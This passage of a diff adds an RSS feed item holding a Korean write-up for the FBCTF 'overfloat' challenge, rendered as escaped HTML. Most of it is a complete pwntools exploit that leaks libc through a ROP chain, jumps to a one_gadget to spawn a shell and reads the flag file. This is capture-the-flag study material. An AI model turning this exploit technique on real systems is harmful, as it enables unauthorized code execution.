+&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; u(overfloat&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;puts)
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;5.87982593553e-39&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;위와 같이 변환해서 보내게 되면 메모리에는 우리가 원하는 가젯의 주소가 들어가게 될 것입니다.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, u(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rdi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address))
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, u(overfloat&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;))
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, u(overfloat&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;puts))
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id=&#34;익스-코드&#34;&gt;익스 코드&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+u &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x: str(struct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;f&amp;#39;&lt;/span&gt;, p32(x))[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])
+
+overfloat &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./overfloat&amp;#39;&lt;/span&gt;, False)
+libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./libc-2.27.so&amp;#39;&lt;/span&gt;, False)
+rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ROP(overfloat)
+
+r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;challenges.fbctf.com&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1341&lt;/span&gt;)
+
+p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;progress(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;):
+    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status(str(_))
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, str(_))
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pop rdi ; ret&amp;#39;&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, u(rop&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rdi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address))
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;stdin@got + 1&amp;#39;&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, u(overfloat&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdin &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;))
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;puts@plt&amp;#39;&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, u(overfloat&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;puts))
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;main@.text&amp;#39;&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, u(overfloat&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;main))
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1st done&amp;#39;&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;done&amp;#39;&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;libc leak&amp;#39;&lt;/span&gt;)
+LEAK &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
+LEAK &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LEAK&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+LEAK &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(LEAK)
+libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LEAK &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_IO_2_1_stdin_
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;libc: {:#x}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address))
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;):
+    p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status(str(_))
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, str(_))
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;one_gadget&amp;#39;&lt;/span&gt;)
+one_gadget &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4f2c5&lt;/span&gt;
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, u(one_gadget &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff&lt;/span&gt;))
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, u(one_gadget &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;))
+
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2nd done&amp;#39;&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;done&amp;#39;&lt;/span&gt;)
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cat /home/overfloat/flag&amp;#39;&lt;/span&gt;)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success()
+r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;참고&lt;br /&gt;
+Online Converter : &lt;a href=&#34;https://www.binaryconvert.com/convert_float.html&#34; target=&#34;_blank&#34;&gt;https://www.binaryconvert.com/convert_float.html&lt;/a&gt;&lt;br /&gt;
+Python Converting Code : &lt;a href=&#34;https://stackoverflow.com/questions/1592158/convert-hex-to-float#answer-1592362&#34; target=&#34;_blank&#34;&gt;https://stackoverflow.com/questions/1592158/convert-hex-to-float#answer-1592362&lt;/a&gt;&lt;br /&gt;
+Python2 struct module : &lt;a href=&#34;https://docs.python.org/2/library/struct.html&#34; target=&#34;_blank&#34;&gt;https://docs.python.org/2/library/struct.html&lt;/a&gt;&lt;br /&gt;
+Python3 struct module : &lt;a href=&#34;https://docs.python.org/3/library/struct.html&#34; target=&#34;_blank&#34;&gt;https://docs.python.org/3/library/struct.html&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
